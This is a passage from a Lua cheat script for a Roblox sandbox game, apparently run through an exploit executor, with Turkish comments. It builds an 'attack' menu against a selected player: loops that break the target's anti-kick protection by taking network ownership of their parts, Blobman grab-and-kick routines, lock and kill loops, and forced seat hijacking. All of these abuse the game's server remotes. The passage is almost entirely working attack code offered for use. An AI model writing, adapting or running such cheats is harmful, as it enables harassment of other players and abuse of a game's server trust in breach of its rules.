        local HitBox = WD:FindFirstChild("Hitbox")
        if not SoundPart or not HitBox then
            task.wait(0.1)
            continue
        end
        local ownStart = tick()
        while HitBox.Parent and not HitBox:FindFirstChild("PartOwner")
            and AttackFuncs.antiAntiKickWDActive and (tick() - ownStart < 5) do
            sno(HitBox)
            task.wait(0.05)
        end
        while AttackFuncs.antiAntiKickWDActive do
            SoundPart = WD and WD.Parent and WD:FindFirstChild("SoundPart")
            _, _, tRoot = AAK_GetTarget()
            if not SoundPart or not tRoot then break end
            SoundPart.CFrame = tRoot.CFrame * CFrame.new(0, 0, 4)
            task.wait()
            SoundPart.CFrame = CFrame.new(-382.838318, 41.6491699, 665.570251)
            SoundPart.AssemblyLinearVelocity = Vector3.zero
            SoundPart.AssemblyAngularVelocity = Vector3.zero
            task.wait(0.2)
        end
    end
end

-- [CLICK] : Hedefin antikick olarak kullandigi StickyPart'larin owner'ini kapar.
local function AntiAntiKickClickFunc()
    while AttackFuncs.antiAntiKickClickActive do
        local target = AAK_GetTarget()
        local tChar = target and target.Character
        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
        local FirePlayerPart = tRoot and tRoot:FindFirstChild("FirePlayerPart")
        local TargetInv = target and Services.Workspace:FindFirstChild(target.Name .. "SpawnedInToys")
        if TargetInv and FirePlayerPart then
            for _, v in pairs(TargetInv:GetChildren()) do
                local StickyPart = v:FindFirstChild("StickyPart")
                if StickyPart then
                    if StickyPart.CanQuery then
                        task.spawn(function()
                            for _, part in pairs(v:GetChildren()) do
                                if part:IsA("BasePart") then
                                    part.CanCollide = false
                                    part.CanTouch = false
                                    part.CanQuery = false
                                end
                            end
                        end)
                    end
                    if not CheckNetworkOwnerOnPart(StickyPart) then
                        sno(StickyPart)
                    end
                end
            end
        end
        task.wait()
    end
end

-- [BYPASS] : Hedefin antikick'ini kirma pahasina kendi FirePlayerPart'ina yapistirir
--            (ping yukseltebilir).
local function AntiAntiKickBypassFunc()
    local StickyRemote = Services.StickyEvent or rs.PlayerEvents.StickyPartEvent
    while AttackFuncs.antiAntiKickBypassActive do
        local myHRP = getHRP()
        local MyFirePart = myHRP and (myHRP:FindFirstChild("FirePlayerPart") or myHRP)
        local target = AAK_GetTarget()
        local tChar = target and target.Character
        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
        local FirePlayerPart = tRoot and tRoot:FindFirstChild("FirePlayerPart")
        local TargetInv = target and Services.Workspace:FindFirstChild(target.Name .. "SpawnedInToys")
        if StickyRemote and MyFirePart and TargetInv and FirePlayerPart then
            for _, v in pairs(TargetInv:GetChildren()) do
                local StickyPart = v:FindFirstChild("StickyPart")
                if StickyPart then
                    local StickyWeld = StickyPart:FindFirstChild("StickyWeld")
                    if StickyWeld then
                        if StickyPart.CanQuery then
                            task.spawn(function()
                                for _, part in pairs(v:GetChildren()) do
                                    if part:IsA("BasePart") then
                                        part.CanCollide = false
                                        part.CanTouch = false
                                        part.CanQuery = false
                                    end
                                end
                            end)
                        end
                        if StickyWeld.Part1 == MyFirePart and GetMagnitude(FirePlayerPart, StickyPart) > 7 then
                            -- hedefin antikicki bizde ama cok uzakta, dokunma
                        elseif not CheckNetworkOwnerOnPart(StickyPart) then
                            sno(StickyPart)
                        else
                            pcall(function()
                                StickyRemote:FireServer(StickyPart, FirePlayerPart, CFrame.new(0, -10, 5))
                            end)
                        end
                    end
                end
            end
        end
        task.wait()
    end
end

EnemySeats = {}

local function TrackSeats()
    for _, player in ipairs(Services.Players:GetPlayers()) do
        if player ~= Services.LocalPlayer then
            local function updateSeat()
                char = player.Character
                if char then
                    hum = char:FindFirstChild("Humanoid")
                    if hum and hum.SeatPart then
                        EnemySeats[player.Name] = hum.SeatPart
                    end
                end
            end
            if player.Character then
                hum = player.Character:FindFirstChild("Humanoid")
                if hum then
                    hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
                        if hum and hum.SeatPart then
                            EnemySeats[player.Name] = hum.SeatPart
                        end
                    end)
                    updateSeat()
                end
            end
            player.CharacterAdded:Connect(function(char)
                hum = char:WaitForChild("Humanoid", 5)
                if hum then
                    hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
                        if hum and hum.SeatPart then
                            EnemySeats[player.Name] = hum.SeatPart
                        end
                    end)
                    task.wait(0.5)
                    updateSeat()
                end
            end)
        end
    end
end

TrackSeats()

Services.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(char)
        hum = char:WaitForChild("Humanoid", 5)
        if hum then
            hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
                if hum.SeatPart then
                    EnemySeats[player.Name] = hum.SeatPart
                end
            end)
            task.wait(0.5)
            if hum.SeatPart then
                EnemySeats[player.Name] = hum.SeatPart
            end
        end
    end)
end)

function DestroyGucci()
    tn = getTargetName()
    if not tn then
        return
    end
    plr = Services.LocalPlayer
    char = plr.Character
    if not char then return end
    hum = char:FindFirstChild("Humanoid")
    hrp = char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end
    Seat = EnemySeats[tn]
    if not Seat or not Seat.Parent then
        return
    end
    pos = hrp.CFrame
    Seat:Sit(hum)
    task.wait(0.3)
    pcall(function()
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.CFrame = pos
    end)
end

function DestroyGucciLoop()
    while AttackFuncs.destroyGucciActive do
        pcall(function()
            DestroyGucci()
        end)
        task.wait(0.5)
    end
end

SavedSafePosition = nil

local function AutoSitBlobmanLoop()
    while _G.AutoSitBlobmanAttack do
        local plr = Services.LocalPlayer
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChild("Humanoid")
        if not hrp or not hum then task.wait(1); continue end
        if hum.SeatPart then task.wait(0.5); continue end
        local fn = plr.Name .. "SpawnedInToys"
        local f = Services.Workspace:FindFirstChild(fn)
        local blob = f and f:FindFirstChild("CreatureBlobman")
        if not blob then
            task.spawn(function()
                pcall(function() 
                    Services.rs.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                        "CreatureBlobman", 
                        hrp.CFrame * CFrame.new(0, 5, 5), 
                        Vector3.zero
                    ) 
                end)
            end)
            if not f then f = Services.Workspace:WaitForChild(fn, 5) end
            if f then blob = f:WaitForChild("CreatureBlobman", 5) end
        end
        if blob then
            local seat = blob:WaitForChild("VehicleSeat", 5)
            if seat then
                local t = tick()
                repeat
                    if not hum.SeatPart then
                        hrp.CFrame = seat.CFrame + Vector3.new(0, 1, 0)
                        hrp.Velocity = Vector3.zero
                        seat:Sit(hum)
                    end
                    task.wait()
                until hum.SeatPart == seat or tick() - t > 1.5 or not _G.AutoSitBlobmanAttack
            end
        end
        task.wait(0.5)
    end
end

local function AutoSitBlobmanSafeLoop()
    safePosition = Vector3.new(115.29, 296.20, 334.78)
    while _G.AutoSitBlobmanSafeAttack do
        plr = Services.LocalPlayer
        char = plr.Character
        hrp = char and char:FindFirstChild("HumanoidRootPart")
        hum = char and char:FindFirstChild("Humanoid")
        if not hrp or not hum then task.wait(1); continue end
        if not SavedSafePosition and hrp then
            SavedSafePosition = hrp.Position
        end
        if hum.SeatPart then task.wait(0.5); continue end
        fn = plr.Name .. "SpawnedInToys"
        f = Services.Workspace:FindFirstChild(fn)
        blob = f and f:FindFirstChild("CreatureBlobman")
        if not blob then
            task.spawn(function()
                pcall(function() 
                    Services.rs.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                        "CreatureBlobman", 
                        CFrame.new(safePosition), 
                        Vector3.zero
                    ) 
                end)
            end)
            if not f then f = Services.Workspace:WaitForChild(fn, 5) end
            if f then blob = f:WaitForChild("CreatureBlobman", 5) end
        end
        if blob then
            seat = blob:WaitForChild("VehicleSeat", 5)
            if seat then
                t = tick()
                repeat
                    if not hum.SeatPart then
                        hrp.CFrame = seat.CFrame + Vector3.new(0, 1, 0)
                        hrp.Velocity = Vector3.zero
                        seat:Sit(hum)
                    end
                    task.wait()
                until hum.SeatPart == seat or tick() - t > 1.5 or not _G.AutoSitBlobmanSafeAttack
            end
        end
        task.wait(0.5)
    end
end

attackPlayerList = updateAttackPlayerList()

AttackTargetGroupbox:AddLabel("Select Target", true, Color3.fromRGB(255, 160, 0))

targetDropdown = AttackTargetGroupbox:AddDropdown("AttackTargetPlayer", {
    Text = "Target Player",
    Values = attackPlayerList,
    Default = attackPlayerList[1] or nil,
    Callback = function(Value) end,
    selectedPlrName = Value
})

AttackTargetGroupbox:AddButton({
    Text = "Refresh List",
    Func = function()
        newList = updateAttackPlayerList()
        targetDropdown:SetValues(newList)
        if #newList > 0 then targetDropdown:SetValue(newList[1]) end
    end
})

AttackTargetGroupbox:AddDivider()

AttackTargetGroupbox:AddToggle("VehicleFly", {
    Text = "Vehicle Fly",
    Default = false,
    Callback = function(Value)
        _G.VehicleFly = Value
        if Value then
            task.spawn(VehicleFlyLoop)
        end
    end
})

AttackTargetGroupbox:AddSlider("VehicleFlySpeed", {
    Text = "Fly Speed",
    Default = 100,
    Min = 1,
    Max = 500,
    Rounding = 0,
    Callback = function(Value)
        _G.VehicleFlySpeed = Value
    end
})

function VehicleFlyLoop()
    Players = game:GetService("Players")
    RunService = game:GetService("RunService")
    UserInputService = game:GetService("UserInputService")
    Workspace = game:GetService("Workspace")
    player = Players.LocalPlayer
    camera = Workspace.CurrentCamera
    if not _G.VehicleFlySpeed then
        _G.VehicleFlySpeed = 100
    end
    local bodyGyro, bodyVel
    local currentVehicle, currentRoot
    isFlying = false
    local function cleanup()
        if bodyGyro then
            bodyGyro:Destroy()
            bodyGyro = nil
        end
        if bodyVel then
            bodyVel:Destroy()
            bodyVel = nil
        end
        isFlying = false
        currentVehicle = nil
        currentRoot = nil
    end
    local function getVehicleModel()
        char = player.Character
        if not char then return nil end
        humanoid = char:FindFirstChildOfClass("Humanoid")
        if not humanoid then return nil end
        seat = humanoid.SeatPart
        if not seat then return nil end
        parent = seat.Parent
        while parent and parent ~= Workspace do
            if parent:IsA("Model") then
                return parent
            end
            parent = parent.Parent
        end
        return seat.Parent
    end
    local function getRootPart(veh)
        if not veh then return nil end
        root = veh.PrimaryPart
        if not root then
            root = veh:FindFirstChild("VehicleSeat") or veh:FindFirstChild("Seat")
        end
        if not root then
            root = veh:FindFirstChildWhichIsA("BasePart")
        end
        return root
    end
    keys = {W = false, A = false, S = false, D = false}
    keyDown = UserInputService.InputBegan:Connect(function(input, gpe)
        if gpe then return end
        key = input.KeyCode.Name
        if keys[key] ~= nil then keys[key] = true end
    end)
    keyUp = UserInputService.InputEnded:Connect(function(input)
        key = input.KeyCode.Name
        if keys[key] ~= nil then keys[key] = false end
    end)
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if not _G.VehicleFly then
            cleanup()
            keyDown:Disconnect()
            keyUp:Disconnect()
            connection:Disconnect()
            return
        end
        vehicle = getVehicleModel()
        if not vehicle then
            if isFlying then cleanup() end
            return
        end        if not isFlying or vehicle ~= currentVehicle then
            cleanup()
            currentVehicle = vehicle
            currentRoot = getRootPart(vehicle)
            if currentRoot then
                bodyGyro = Instance.new("BodyGyro")
                bodyGyro.P = 9e4
                bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
                bodyGyro.CFrame = currentRoot.CFrame
                bodyGyro.Parent = currentRoot
                bodyVel = Instance.new("BodyVelocity")
                bodyVel.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                bodyVel.Velocity = Vector3.new(0, 0, 0)
                bodyVel.Parent = currentRoot
                isFlying = true
            end
        end
        if not isFlying or not currentRoot or not currentRoot.Parent then
            cleanup()
            return
        end
        camCF = camera.CFrame
        speed = _G.VehicleFlySpeed or 100
        moveDir = Vector3.new(0, 0, 0)
        if keys.W then moveDir = moveDir + camCF.LookVector end
        if keys.S then moveDir = moveDir - camCF.LookVector end
        if keys.A then moveDir = moveDir - camCF.RightVector end
        if keys.D then moveDir = moveDir + camCF.RightVector end
        if moveDir.Magnitude > 0 then
            moveDir = moveDir.Unit * speed
        end
        bodyVel.Velocity = moveDir
        bodyGyro.CFrame = camCF
    end)
end

AttackTargetGroupbox:AddToggle("AutoSitBlobman", {
    Text = "Auto Sit Blobman",
    Default = false,
    Callback = function(Value)
        _G.AutoSitBlobmanAttack = Value
        if Value then task.spawn(AutoSitBlobmanLoop) end
    end
})

AttackTargetGroupbox:AddToggle("AutoSitBlobmanSafe", {
    Text = "Auto Blobman (Safe)",
    Default = false,
    Callback = function(Value)
        _G.AutoSitBlobmanSafeAttack = Value
        if Value then 
            SavedSafePosition = nil
            task.spawn(AutoSitBlobmanSafeLoop) 
        end
    end
})

AttackTargetGroupbox:AddButton({
    Text = "TP Back to Original Pos",
    Func = function()
        plr = Services.LocalPlayer
        char = plr.Character
        hrp = char and char:FindFirstChild("HumanoidRootPart")
        hum = char and char:FindFirstChild("Humanoid")
        if not hrp or not hum then
            return
        end
        if not SavedSafePosition then
            return
        end
        if hum.SeatPart then
            hum.Sit = false
            task.wait(0.1)
        end
        hrp.CFrame = CFrame.new(SavedSafePosition)
        hrp.Velocity = Vector3.zero
    end
})

AttackTargetGroupbox:AddDivider()

AttackTargetGroupbox:AddLabel("One-Click Actions", true, Color3.fromRGB(255, 150, 50))

AttackTargetGroupbox:AddButton({ Text = "Bring", Func = BringOnce })
AttackTargetGroupbox:AddButton({ Text = "Kick", Func = KickOnce })
AttackTargetGroupbox:AddButton({ Text = "Blob Kill", Func = BlobKillOnce })

AttackMethodsGroupbox:AddLabel("Blobman Loops", true, Color3.fromRGB(255, 100, 100))

AttackMethodsGroupbox:AddToggle("BringLoopToggle", {
    Text = "Bring Loop", Default = false,
    Callback = function(v) AttackFuncs.bringActive = v; if v then AttackFuncs.bringTask = task.spawn(BringLoop) elseif AttackFuncs.bringTask then task.cancel(AttackFuncs.bringTask) end end
})

AttackMethodsGroupbox:AddToggle("KickLoopToggle", {
    Text = "Kick Loop V1", Default = false,
    Callback = function(v) AttackFuncs.kickActive = v; if v then AttackFuncs.kickTask = task.spawn(KickLoop) elseif AttackFuncs.kickTask then task.cancel(AttackFuncs.kickTask) end end
})

AttackMethodsGroupbox:AddToggle("LoopKickToggle", {
    Text = "Loop Kick (ORBIT)", Default = false,
    Callback = function(v) 
        AttackFuncs.loopKickActive = v
        if v then 
            if AttackFuncs.loopKickTask then task.cancel(AttackFuncs.loopKickTask) end
            AttackFuncs.loopKickTask = task.spawn(LoopKickFunc)
        elseif AttackFuncs.loopKickTask then 
            task.cancel(AttackFuncs.loopKickTask)
        end
    end
})

AttackMethodsGroupbox:AddToggle("LoopKickBlobToggle", {
    Text = "Blobman Kick (Classic)", Default = false,
    Callback = function(v) AttackFuncs.loopKickBlobActive = v; if v then AttackFuncs.loopKickBlobTask = task.spawn(LoopKickBlobLoop) elseif AttackFuncs.loopKickBlobTask then task.cancel(AttackFuncs.loopKickBlobTask) end end
})

AttackMethodsGroupbox:AddToggle("KOZMOZGrabBlob", {
    Text = "Blobman kick (Bypass) [DoubleHand]",
    Default = false,
    Callback = function(on)
        kickLoopEnabled = on
        loopKickDualActive = on
        if on then
            targetName = getTargetName()
            if not targetName or targetName == "" then
                kickLoopEnabled = false
                loopKickDualActive = false
                return
            end
            task.spawn(function()
                RS = game:GetService("ReplicatedStorage")
                RunService = game:GetService("RunService")
                GE = RS:FindFirstChild("GrabEvents")
                plr = Services.LocalPlayer
                Players = game:GetService("Players")
                myChar = plr.Character
                if not myChar then
                    kickLoopEnabled = false
                    loopKickDualActive = false
                    return 
                end
                myHum = myChar:FindFirstChildOfClass("Humanoid")
                myRoot = myChar:FindFirstChild("HumanoidRootPart")
                if not myRoot or not myHum then 
                    kickLoopEnabled = false
                    loopKickDualActive = false
                    return 
                end
                savedPos = myRoot.CFrame
                dragging = false
                grabStartTime = 0
                target = nil
                tChar = nil
                tRoot = nil
                tHum = nil
                blobman = nil
                grab = nil
                drop = nil
                L_Det = nil
                R_Det = nil
                L_Weld = nil
                R_Weld = nil
                lastTargetUserId = nil
                lastTargetHRP = nil
                respawnDetected = false
                tooFarDetected = false
                while kickLoopEnabled do
                    target = Players:FindFirstChild(targetName)
                    if not target or not target.Parent then 
                        break 
                    end
                    tChar = target.Character
                    if not tChar then
                        task.wait(0.1)
                        continue
                    end
                    local currentUserId = target.UserId
                    local currentHRP = tChar:FindFirstChild("HumanoidRootPart")
                    if lastTargetUserId and lastTargetUserId ~= currentUserId then
                        respawnDetected = true
                    end
                    if lastTargetHRP and currentHRP and lastTargetHRP ~= currentHRP then
                        respawnDetected = true
                    end
                    if respawnDetected then
                        respawnDetected = false
                        dragging = false
                        grabStartTime = 0
                        task.wait(0.3)
                    end
                    lastTargetUserId = currentUserId
                    lastTargetHRP = currentHRP
                    tRoot = tChar:FindFirstChild("HumanoidRootPart")
                    tHum = tChar:FindFirstChildOfClass("Humanoid")
                    if not tRoot or not tHum then
                        task.wait(0.1)
                        continue
                    end
                    local health = 0
                    pcall(function() health = tHum.Health end)
                    if health <= 0 then
                        task.wait(0.1)
                        continue
                    end
                    local distance = 0
                    pcall(function() distance = (myRoot.Position - tRoot.Position).Magnitude end)
                    if distance >= 500 then
                        if not tooFarDetected then
                            tooFarDetected = true
                            dragging = false
                            grabStartTime = 0
                            task.wait(0.2)
                        end
                    else
                        tooFarDetected = false
                    end
                    local seat = myHum.SeatPart
                    if not seat then
                        break
                    end
                    blobman = seat.Parent
                    if not blobman or blobman.Name ~= "CreatureBlobman" then
                        break
                    end
                    local remoteFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                    grab = remoteFolder and remoteFolder:FindFirstChild("CreatureGrab")
                    drop = remoteFolder and remoteFolder:FindFirstChild("CreatureDrop")
                    L_Det = blobman:FindFirstChild("LeftDetector")
                    R_Det = blobman:FindFirstChild("RightDetector")
                    L_Weld = L_Det and (L_Det:FindFirstChild("LeftWeld") or L_Det:FindFirstChild("RigidConstraint"))
                    R_Weld = R_Det and (R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChild("RigidConstraint"))
                    pcall(function()
                        tRoot.AssemblyLinearVelocity = Vector3.zero
                        tRoot.AssemblyAngularVelocity = Vector3.zero
                    end)
                    if grab and drop and L_Weld and R_Weld then
                        pcall(function()
                            grab:FireServer(L_Det, tRoot, L_Weld)
                            grab:FireServer(R_Det, tRoot, R_Weld)
                            drop:FireServer(L_Weld, tRoot)
                            drop:FireServer(R_Weld, tRoot)
                        end)
                    end
                    if not dragging then
                        pcall(function()
                            myRoot.CFrame = tRoot.CFrame
                        end)
                        if GE then
                            pcall(function()
                                tHum.PlatformStand = true
                                GE.SetNetworkOwner:FireServer(tRoot, myRoot.CFrame)
                            end)
                        end
                        if grabStartTime == 0 then grabStartTime = tick() end
                        if tick() - grabStartTime > 0.3 then
                            dragging = true
                            grabStartTime = 0
                        end
                    else
                        local lockPos = savedPos * CFrame.new(0, 23, 0)
                        pcall(function()
                            myRoot.CFrame = savedPos
                            tRoot.CFrame = lockPos
                            tHum.PlatformStand = true
                        end)
                        if GE then
                            pcall(function()
                                GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                GE.DestroyGrabLine:FireServer(tRoot)
                            end)
                        end
                    end
                    RunService.Heartbeat:Wait()
                end
                pcall(function()
                    if myRoot and myRoot.Parent then
                        myRoot.CFrame = savedPos
                    end
                end)
                kickLoopEnabled = false
                loopKickDualActive = false
            end)
        else
            kickLoopEnabled = false
            loopKickDualActive = false
        end
    end
})
AttackMethodsGroupbox:AddToggle("BlobKillLoopToggle", {
    Text = "Blob Kill Loop", Default = false,
    Callback = function(v) AttackFuncs.blobKillActive = v; if v then AttackFuncs.blobKillTask = task.spawn(BlobKillLoop) elseif AttackFuncs.blobKillTask then task.cancel(AttackFuncs.blobKillTask) end end
})

AttackMethodsGroupbox:AddToggle("LockToggle", {
    Text = "Lock", Default = false,
    Callback = function(v)
        if v then
            BlobLock:Start()
            AttackFuncs.blobLockTask = task.spawn(function() while BlobLock.Running do task.wait(0.1) end end)
        else
            BlobLock:Stop()
            if AttackFuncs.blobLockTask then task.cancel(AttackFuncs.blobLockTask) end
        end
    end
})

AttackMethodsGroupbox:AddDivider()
AttackMethodsGroupbox:AddLabel("Kick Methods", true, Color3.fromRGB(255, 150, 50))

-- =====================================================================
-- [KOZMOZ PORT] Kick Method motoru (5 kick cesidi + Kick toggle)
-- kaynak: endrst 1210-2071 (BlobmanBetaFeature yardimcilari) ve
-- 4780-5368 (Kick Method secim kutusu + Kick toggle govdesi).
-- kozmoz'un hedef secimi (getTargetName), KozRemote/KozFlags tablolari ve
-- KozUtil yardimcilariyla konusacak sekilde uyarlandi; mantigin tamami
-- (drift kick, blobman kilitleme, PCLD, temizlik) tasiindi.
-- =====================================================================
do
    -- endrst: BlobmanBetaFeature modulunun kick icin gereken tum yardimcilari
    local KozBlobmanBetaFeature = {}

    -- kozmoz'da hedef, AttackMethods secim kutusundan alinir (musa/endrst'deki
    -- Blobman secim kutusunun karsiligi: getTargetName)
    local function kozKickTargetName()
        if KozFlags.selectedTarget then
            return KozFlags.selectedTarget
        end
        local ok, nm = pcall(getTargetName)
        return (ok and nm ~= nil and nm ~= "") and nm or nil
    end

    -- kozmoz'un diger bolumlerindeki koruma kontrolu ile ayni davranis
    local function isProtectedPlayer(name)
        return name == "5fkX0ofvIGfU"
    end

    -- endrst'te bir kurulum adimiyla doldurulan liste; burada bos baslar
    KozFlags.ignoreHeights = KozFlags.ignoreHeights or {}

    -- endrst: "Kick Method" secim kutusu (kick cesitleri)
    AttackMethodsGroupbox:AddDropdown("KozKickMethod", {
        Text = "Kick Method",
        Values = {"Kick Double Hands", "Kick Grab + Blob", "Kick One Grab", "Kick Fly Up",
            "Kick Drift Fly"},
        Default = "Kick Double Hands",
        Callback = function(Value)
            KozFlags.kickMethod = Value
        end,
    })

    function KozBlobmanBetaFeature.getLocalChar() return KozPLR.Character end
    function KozBlobmanBetaFeature.getLocalRoot()
        local c = KozBlobmanBetaFeature.getLocalChar()
        if not c then return end
        return c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso")
    end
    function KozBlobmanBetaFeature.getLocalHum()
        local c = KozBlobmanBetaFeature.getLocalChar()
        if not c then return end
        return c:FindFirstChildOfClass("Humanoid")
    end
    function KozBlobmanBetaFeature.getInv()
        return KozWS:FindFirstChild(KozPLR.Name .. "SpawnedInToys")
    end
    function KozBlobmanBetaFeature.getCurrentPlot()
        local myRoot = KozBlobmanBetaFeature.getLocalRoot()
        if not myRoot then return nil end
        local plots = KozWS:FindFirstChild("PlotItems")
        if not plots then return nil end
        for i = 1, 5 do
            local plot = plots:FindFirstChild("Plot" .. i)
            if plot then
                local pp = plot:FindFirstChildWhichIsA("Part") or plot:FindFirstChild("Baseplate")
                if not pp then
                    for _, v in ipairs(plot:GetChildren()) do
                        if v:IsA("BasePart") then pp = v break end
                    end
                end
                if pp then
                    local dist = (myRoot.Position - pp.Position).Magnitude
                    if dist < 100 then return plot end
                end
            end
        end
        return nil
    end
    function KozBlobmanBetaFeature.SetNetworkOwner(part)
        pcall(function() KozRemote.SetNetworkOwner:FireServer(part, KozBlobmanBetaFeature.getLocalRoot().CFrame) end)
    end
    function KozBlobmanBetaFeature.ungrab(part)
        pcall(function() KozRemote.DestroyGrabLine:FireServer(part) end)
    end
    function KozBlobmanBetaFeature.getBlobman()
        local hum = KozBlobmanBetaFeature.getLocalHum()
        if hum and hum.Sit and hum.SeatPart and hum.SeatPart.Parent then
            if hum.SeatPart.Parent.Name == "CreatureBlobman" then
                return hum.SeatPart.Parent
            end
        end
        local inv = KozBlobmanBetaFeature.getInv()
        if inv then
            local v = inv:FindFirstChild("CreatureBlobman")
            if v and v.ClassName == "Model" and v:FindFirstChild("VehicleSeat") then return v end
        end
        return nil
    end

    function KozBlobmanBetaFeature.findAnyBlobman()
        if not KozFlags.unsafeBlobman then return nil end
        local myRoot = KozBlobmanBetaFeature.getLocalRoot()
        local closest, closestDist = nil, math.huge
        local function checkFolder(folder)
            if not folder then return end
            for _, obj in ipairs(folder:GetChildren()) do
                if obj.Name == "CreatureBlobman" and obj:IsA("Model") then
                    local seat = obj:FindFirstChild("VehicleSeat")
                    if seat then
                        local dist = myRoot and (obj:GetPivot().Position - myRoot.Position).Magnitude or 0
                        if dist < closestDist then
                            closestDist = dist
                            closest = obj
                        end
                    end
                end
            end
        end
        checkFolder(KozBlobmanBetaFeature.getInv())
        if not closest then
            for _, obj in ipairs(KozWS:GetChildren()) do
                if obj.Name == "CreatureBlobman" and obj:IsA("Model") then
                    local seat = obj:FindFirstChild("VehicleSeat")
                    if seat then
                        local dist = myRoot and (obj:GetPivot().Position - myRoot.Position).Magnitude or 0
                        if dist < 100000 and dist < closestDist then
                            closestDist = dist
                            closest = obj
                        end
                    end
                end
            end
        end
        if not closest then
            local plotItems = KozWS:FindFirstChild("PlotItems")
            if plotItems then
                for _, plot in ipairs(plotItems:GetChildren()) do
                    checkFolder(plot)
                end
            end
        end
        if not closest then
            local plots = KozWS:FindFirstChild("Plots")
            if plots then
                for _, plot in ipairs(plots:GetChildren()) do
                    checkFolder(plot)
                end
            end
        end
        return closest
    end
    function KozBlobmanBetaFeature.spawnBlobman()
        local myRoot = KozBlobmanBetaFeature.getLocalRoot()
        if not myRoot then
            local myChar = KozPLR.Character
            if myChar then myRoot = myChar:FindFirstChild("HumanoidRootPart") end
        end
        if not myRoot then return nil end
        local existing = KozBlobmanBetaFeature.getBlobman()
        if existing then return existing end
        local anyBlob = KozBlobmanBetaFeature.findAnyBlobman()
        if anyBlob and anyBlob:FindFirstChild("VehicleSeat") then
            return anyBlob
        end
        local inv = KozBlobmanBetaFeature.getInv()
        local SpawnedToy = nil
        if inv then
            local conn
            conn = inv.ChildAdded:Connect(function(toy)
                if toy.Name == "CreatureBlobman" and toy:IsA("Model") then
                    SpawnedToy = toy
                    conn:Disconnect()
                end
            end)
            task.spawn(function()
                pcall(function()
                    KozRemote.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", myRoot.CFrame * CFrame.new(3, 0, 0), Vector3.zero)
                end)
            end)
            local t = tick()
            while not SpawnedToy do
                if tick() - t > 2 then
                    conn:Disconnect()
                    break
                end
                task.wait(0.01)
            end
        end
        if SpawnedToy then
            if not SpawnedToy:FindFirstChild("VehicleSeat") then
                SpawnedToy:WaitForChild("VehicleSeat", 2)
            end
            return SpawnedToy
        end
        return KozBlobmanBetaFeature.getBlobman()
    end
    function KozBlobmanBetaFeature.destroyBlobman()
        local blob = KozBlobmanBetaFeature.getBlobman()
        if blob then pcall(function() KozRemote.DestroyToy:FireServer(blob) end) end
    end
    function KozBlobmanBetaFeature.resetBlobmanPhysics()
        local blob = KozBlobmanBetaFeature.getBlobman()
        if not blob then return end
        for _, part in blob:GetDescendants() do
            if part:IsA("BasePart") then
                part.AssemblyLinearVelocity = Vector3.zero
                part.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end
    function KozBlobmanBetaFeature.stabilizeBlobman()
        local blob = KozBlobmanBetaFeature.getBlobman()
        if not blob or not blob:FindFirstChild("VehicleSeat") then return end
        local seat = blob.VehicleSeat
        if seat then
            seat.CFrame = seat.CFrame + (KozBlobmanBetaFeature.getLocalRoot().CFrame.Position - seat.Position) * 0.1
        end
    end
    function KozBlobmanBetaFeature.isSittingOnBlobman()
        local hum = KozBlobmanBetaFeature.getLocalHum()
        return hum and hum.Sit and hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman"
    end

    function KozBlobmanBetaFeature.ensureSeatedOnBlobman()
        if KozBlobmanBetaFeature.isSittingOnBlobman() then return true end
        return KozBlobmanBetaFeature.forceSitBlobman()
    end
    function KozBlobmanBetaFeature.ensureSitBlobman()
        local blob = KozBlobmanBetaFeature.getBlobman()
        if not blob or not blob:FindFirstChild("VehicleSeat") then
            blob = KozBlobmanBetaFeature.spawnBlobman()
        end
        if not blob or not blob:FindFirstChild("VehicleSeat") then
            blob = KozBlobmanBetaFeature.findAnyBlobman()
        end
        if not blob or not blob:FindFirstChild("VehicleSeat") then return false end
        local seat = blob.VehicleSeat
        local hum = KozBlobmanBetaFeature.getLocalHum()
        local myRoot = KozBlobmanBetaFeature.getLocalRoot()
        if hum and not hum.Sit and myRoot then
            myRoot.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
            task.wait(0.05)
            seat:Sit(hum)
            task.wait(0.1)
        end
        KozBlobmanBetaFeature.resetBlobmanPhysics()
        KozBlobmanBetaFeature.stabilizeBlobman()
        return KozBlobmanBetaFeature.isSittingOnBlobman()
    end
    function KozBlobmanBetaFeature.blobGrab(blob, target, side)
        if not blob then return end
        local detector = blob:FindFirstChild(side .. "Detector")
        if not detector then return end
        local weld = detector:FindFirstChild(side .. "Weld")
        if not weld then return end
        local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
        if not script then return end
        local remote = script:FindFirstChild("CreatureGrab")
        if remote then pcall(function() remote:FireServer(detector, target, weld) end) end
    end
    function KozBlobmanBetaFeature.blobDrop(blob, target, side)
        if not blob then return end
        local detector = blob:FindFirstChild(side .. "Detector")
        if not detector then return end
        local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
        if not script then return end
        local remote = script:FindFirstChild("CreatureDrop")
        if remote then pcall(function() remote:FireServer(detector, target) end) end
    end
    function KozBlobmanBetaFeature.blobKick(blob, target, side)
        if not blob or not target then return end
        KozBlobmanBetaFeature.blobGrab(blob, KozBlobmanBetaFeature.getLocalRoot(), side)
        task.wait(0.02)
        KozBlobmanBetaFeature.SetNetworkOwner(target)
        task.wait(0.02)
        target.CFrame = target.CFrame + Vector3.new(0, (KozFlags.FloatAmount or 0), 0)
        task.wait(0.02)
